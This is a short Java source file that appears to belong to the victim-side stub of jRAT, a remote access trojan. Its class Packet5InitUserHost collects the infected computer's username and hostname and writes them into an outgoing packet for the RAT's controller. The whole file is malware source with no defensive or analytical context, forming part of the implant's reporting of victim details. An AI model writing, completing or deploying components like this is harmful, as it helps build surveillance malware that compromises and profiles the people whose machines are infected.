package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;
import se.jrat.common.utils.UserUtils;


public class Packet5InitUserHost extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String username = System.getProperty("user.name");
		String hostname = UserUtils.getHostname();
		
		sw.writeLine(username);
		sw.writeLine(hostname);
	}

	@Override
	public byte getPacketId() {
		return (byte) 5;
	}
}